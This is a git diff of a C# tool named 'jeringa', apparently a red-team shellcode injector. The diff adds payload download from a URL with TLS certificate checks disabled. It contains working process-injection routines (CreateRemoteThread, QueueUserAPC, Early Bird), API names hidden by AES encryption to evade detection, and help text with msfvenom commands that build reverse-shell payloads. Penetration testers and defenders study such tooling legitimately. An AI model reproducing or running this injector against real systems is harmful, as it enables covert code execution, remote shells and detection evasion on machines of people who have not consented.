@@ -55,6 +55,7 @@ namespace jeringa
         delegate uint ResumeThreadDelegate(IntPtr hThread);
         delegate IntPtr OpenThreadDelegate(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
 
+
         static String EncryptStringToBytes(string plainText, byte[] Key, byte[] IV)
         {
             if (plainText == null || plainText.Length <= 0)
@@ -121,7 +122,6 @@ namespace jeringa
             IntPtr processHandle = IntPtr.Zero;
             try
             {
-                // Delegates 
                 IntPtr a32 = GetModuleHandle("advapi32.dll");
                 IntPtr addrOpenProcessToken = GetProcAddress(a32, "OpenProcessToken");
                 OpenProcessTokenDelegate auxOpenProcessToken = (OpenProcessTokenDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcessToken, typeof(OpenProcessTokenDelegate));
@@ -138,7 +138,6 @@ namespace jeringa
             {
                 if (processHandle != IntPtr.Zero)
                 {
-                    // Delegates 
                     IntPtr k32 = GetModuleHandle("kernel32.dll");
                     IntPtr addrCloseHandle = GetProcAddress(k32, "CloseHandle");
                     CloseHandleDelegate auxCloseHandle = (CloseHandleDelegate)Marshal.GetDelegateForFunctionPointer(addrCloseHandle, typeof(CloseHandleDelegate));
@@ -146,6 +145,7 @@ namespace jeringa
                 }
             }
         }
+
 
         static Dictionary<string, string> getProcessPids(String process_name)
         {
@@ -178,6 +178,7 @@ namespace jeringa
             return user_pid;
         }
 
+
         public static byte[] ToByteArray(String hexString)
         {
             byte[] retval = new byte[hexString.Length / 2];
@@ -187,47 +188,62 @@ namespace jeringa
         }
 
 
-        static byte[] getPayload(String payload)
+        static byte[] getPayload(String payload_str)
         {
-            if (payload == null)
+            // Payload from standard input
+            if (payload_str == null)
             {
                 byte[] inputBuffer = new byte[1024];
                 Stream inputStream = Console.OpenStandardInput(inputBuffer.Length);
                 Console.SetIn(new StreamReader(inputStream, Console.InputEncoding, false, inputBuffer.Length));
                 Console.WriteLine("[+] Write hexadecimal payload or url (or Enter to exit):");
-                payload = Console.ReadLine();
+                payload_str = Console.ReadLine();
             }
 
             byte[] buf = { };
-            if (payload == "")
+            if (payload_str == "")
             {
                 Console.WriteLine("[-] Exiting...");
                 System.Environment.Exit(0);
             }
-            // else check url
-            ///// 
 
-            // else hexadecimal 
+            // Payload from url, http or https
+            else if (payload_str.Substring(0, 4) == "http") {
+                Console.WriteLine("[+] Getting payload from url: "+ payload_str);
+                System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
+                using (System.Net.WebClient myWebClient = new System.Net.WebClient())
+                {
+                    try
+                    {
+                        System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+                        buf = myWebClient.DownloadData(payload_str);
+
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.ToString());
+                    }
+                }
+
+            }
+
+            // Hexadecimal payload
             else
             {
-                buf = ToByteArray(payload);
+                buf = ToByteArray(payload_str);
             }
+
             return buf;
         }
 
 
         static void injectShellcodeCreateRemoteThread(String processPID, String payload)
         {
-            // Delegates 
             IntPtr k32 = GetModuleHandle("kernel32.dll");
-
             RijndaelManaged myRijndael = new RijndaelManaged();
             String password = "ricardojoserf   ";
             String iv = "jeringa jeringa ";
-
-            // String encrypted = EncryptStringToBytes("QueueUserAPC", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-            // Console.WriteLine(encrypted);
-
             String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
@@ -237,14 +253,11 @@ namespace jeringa
             IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
             IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
             IntPtr addrCreateRemoteThread = GetProcAddress(k32, decryptedCreateRemoteThread);
-            
             OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
             VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
             WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
             CreateRemoteThreadDelegate auxCreateRemoteThread = (CreateRemoteThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrCreateRemoteThread, typeof(CreateRemoteThreadDelegate));
 
-            // Create handle to the process
-            // We need (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION), we can get the values from https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
             String processname = Process.GetProcessById(Int32.Parse(processPID)).ProcessName;
             uint processRights = 0x0010 | 0x0400;
             IntPtr processHandle = auxOpenProcess(processRights, false, Int32.Parse(processPID));
@@ -259,25 +272,18 @@ namespace jeringa
 
             IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int16.Parse(processPID));
             IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
-
             byte[] buf = getPayload(payload);
-
-            IntPtr outSize;
-            auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
+            auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
             IntPtr hThread = auxCreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
         }
 
 
         static void injectShellcodeQueueUserAPC(String processPID, String payload)
         {
-
-            // Delegates 
             IntPtr k32 = GetModuleHandle("kernel32.dll");
-
             RijndaelManaged myRijndael = new RijndaelManaged();
             String password = "ricardojoserf   ";
             String iv = "jeringa jeringa ";
-
             String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
@@ -289,7 +295,6 @@ namespace jeringa
             IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
             IntPtr addrQueueUserAPC = GetProcAddress(k32, decryptedQueueUserAPC);
             IntPtr addrOpenThread = GetProcAddress(k32, decryptedOpenThread);
-            
             OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
             VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
             WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
@@ -297,7 +302,6 @@ namespace jeringa
             OpenThreadDelegate auxOpenThread = (OpenThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenThread, typeof(OpenThreadDelegate));
 
             byte[] buf = getPayload(payload);
-
             String processname = Process.GetProcessById(Int32.Parse(processPID)).ProcessName;
             uint processRights = 0x0010 | 0x0400;
             IntPtr processHandle = auxOpenProcess(processRights, false, Int32.Parse(processPID));
@@ -313,32 +317,18 @@ namespace jeringa
             IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int16.Parse(processPID));           
             IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000, 0x20); // 0x20: PAGE_EXECUTE_READ; 0x1000 = MEM_COMMIT
             auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
-            // Console.WriteLine("VA:  " + addr.ToString("X"));
             ProcessThread hThread = Process.GetProcessById(Int16.Parse(processPID)).Threads[0];
             IntPtr hThreadId = auxOpenThread(0x0010, false, (uint)hThread.Id);
             auxQueueUserAPC(addr, hThreadId, 0);
-
-            /*
-            foreach (ProcessThread thread in Process.GetProcessById(Int16.Parse(processPID)).Threads)
-            {
-                IntPtr threadHandle = OpenThread(ThreadAccess.SET_CONTEXT, false, (uint)thread.Id);
-                QueueUserAPC(addr, threadHandle, 0);
-                Console.WriteLine("Thread ID: " + thread.Id + "   \tThread handle: " + threadHandle);
-                
-            }
-            */
         }
 
 
         static void injectShellcodeEarlyBird(String processname, String payload)
         {
-            // Delegates
             IntPtr k32 = GetModuleHandle("kernel32.dll");
-
             RijndaelManaged myRijndael = new RijndaelManaged();
             String password = "ricardojoserf   ";
             String iv = "jeringa jeringa ";
-
             String decryptedCreateProcessA = DecryptStringFromBytes("2FXtT/hu7ZEj8oz79680TQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
@@ -350,7 +340,6 @@ namespace jeringa
             IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
             IntPtr addrQueueUserAPC = GetProcAddress(k32, decryptedQueueUserAPC);
             IntPtr addrResumeThread = GetProcAddress(k32, decryptedResumeThread);
-
             CreateProcessDelegate auxCreateProcess = (CreateProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrCreateProcess, typeof(CreateProcessDelegate));
             VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
             WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
@@ -361,10 +350,7 @@ namespace jeringa
             var si = new STARTUPINFO();
             si.cb = Marshal.SizeOf(si);
             var pi = new PROCESS_INFORMATION();
-
-            // bool success = CreateProcess("C:\\Windows\\System32\\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
             bool success = auxCreateProcess(processname, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
-
             Console.WriteLine("[+] Trying to spawn a suspended process for "+processname);
             if (success)
             {
@@ -377,63 +363,77 @@ namespace jeringa
 
             Console.WriteLine("[+] Process PID: " + pi.dwProcessId);
             Console.WriteLine("[+] Thread ID:   " + pi.dwThreadId);
-
             byte[] buf = getPayload(payload);
-                
-
             var baseAddress = auxVirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x20);
             auxWriteProcessMemory(pi.hProcess, baseAddress, buf, buf.Length, out _);
             auxQueueUserAPC(baseAddress, pi.hThread, 0);
             auxResumeThread(pi.hThread);
         }
 
-            static void listInfo(Dictionary<string, string> processPIDs)
+
+        static void listInfo(Dictionary<string, string> processPIDs)
         {
             Console.WriteLine("{0,40} | {1,10} | {2,20}", "Process Name", "PID", "Process Owner");
             Console.WriteLine(string.Concat(Enumerable.Repeat("-", 80)));
             foreach (KeyValuePair<string, string> kvp in processPIDs)
             {
-                //Console.WriteLine("Name = {0}\tPID = {1}\tUser = {2}", Process.GetProcessById(Int32.Parse(kvp.Key)).ProcessName, kvp.Key, kvp.Value);
                 Console.WriteLine("{0,40} | {1,10} | {2,20}", Process.GetProcessById(Int32.Parse(kvp.Key)).ProcessName, kvp.Key, kvp.Value);
-                // Console.WriteLine("[+] " + kvp.Value);
             }
 
         }
 
         static void getHelp()
         {
-            Console.WriteLine("[+] List processes:");
-            Console.WriteLine("Program.exe list all\n");
+            Console.WriteLine("[+] Option \"list\" to  enumerate all processes or filter by name or owner.\n");
+            Console.WriteLine("[*] List all processes:");
+            Console.WriteLine("jeringa.exe list all");
+            Console.WriteLine("[*] List processes with a specific name (\"explorer\") or process owner (\"DESKTOP-MA54241\\ricardo\"):");
+            Console.WriteLine("jeringa.exe list explorer");
+            Console.WriteLine("jeringa.exe list \"DESKTOP-MA54241\\ricardo\"");
+            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 150)));
 
-            Console.WriteLine("[+] List processes with a specific name (\"explorer\") or process owner (\"ricardo\"):");
-            Console.WriteLine("Program.exe list explorer");
-            Console.WriteLine("Program.exe list \"DESKTOP-MA54241\\ricardo\"\n");
+            Console.WriteLine("[+] Injection \"inject-crt\" (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread) \n[+] You can use the process PID or the name and owner; the payload can be in HEX format or a url to download it, or the program asks for a value.\n");
+            Console.WriteLine("[*] Injection using process name, process owner and payload in HEX format:");
+            Console.WriteLine("jeringa.exe inject-crt explorer \"DESKTOP-MA54241\\ricardo\" [ fc4883e4f0e8... ]");
+            Console.WriteLine("[*] Injection using PID (\"1234\") and a url to download the payload:");
+            Console.WriteLine("jeringa.exe inject-crt 1234 http://127.0.0.1/payload.bin");
+            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 150)));
 
-            Console.WriteLine("[+] Inject using process name, process owner and optionally payload in HEX format (if not provided the program requests it):");
-            Console.WriteLine("Program.exe inject explorer \"DESKTOP-MA54241\\ricardo\" [ fc4883e4f0e8... ]\n");
+            Console.WriteLine("[+] Injection \"inject-apc\" (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC) \n[+] You can use the process PID or the name and owner; the payload can be in HEX format or a url to download it, or the program asks for a value.\n");
+            Console.WriteLine("[*] Injection using process name, process owner and payload in HEX format:");
+            Console.WriteLine("jeringa.exe inject-apc explorer \"DESKTOP-MA54241\\ricardo\" [ fc4883e4f0e8... ]");
+            Console.WriteLine("[*] Injection using PID (\"1234\") and a url to download the payload:");
+            Console.WriteLine("jeringa.exe inject-apc 1234 http://127.0.0.1/payload.bin");
+            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 150)));
 
-            Console.WriteLine("[+] Inject using PID (\"1234\") and optionally payload in HEX format (if not provided the program requests it):");
-            Console.WriteLine("Program.exe inject 1234 [ fc4883e4f0e8... ]\n");
+            Console.WriteLine("[+] Injection \"earlybird\" (CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread) \n[+] You set the program path; the payload can be in HEX format or a url to download it, or the program asks for a value.\n");
+            Console.WriteLine("[*] Injection using program path and payload in HEX format:");
+            Console.WriteLine("jeringa.exe earlybird \"c:\\windows\\system32\\notepad.exe\" [ fc4883e4f0e8... ]");
+            Console.WriteLine("[*] Injection using program path and a url to download the payload:");
+            Console.WriteLine("jeringa.exe earlybird \"c:\\windows\\system32\\calc.exe\" http://127.0.0.1/payload.bin");
+            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 150)));
 
-            Console.WriteLine("[+] NOTE: You can use your own shellcode or create one in the expected format with Msfvenom:");
+            Console.WriteLine("[*] Create payload in HEX format using Msfvenom with:");
             Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\\x' | tr -d '\"\\n\\\\x;'\n");
+            Console.WriteLine("[*] Create payload in raw format for url option using Msfvenom with:");
+            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f bin > payload.bin");
 
             System.Environment.Exit(0);
         }
 
-        static void Main(string[] args)
-        {
 
-            // Check we are running an elevated process
-            /*
-             * if (WindowsIdentity.GetCurrent().Owner
-                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
+        static bool checkElevated() {
+            if (WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
             {
                 Console.WriteLine("[-] Error: Execute with administrative privileges.");
-                return;
+                return false;
             }
-            */
+            return true;
+        }
 
+
+        static void Main(string[] args)
+        {
             if (args.Length < 2)
             {
                 getHelp();
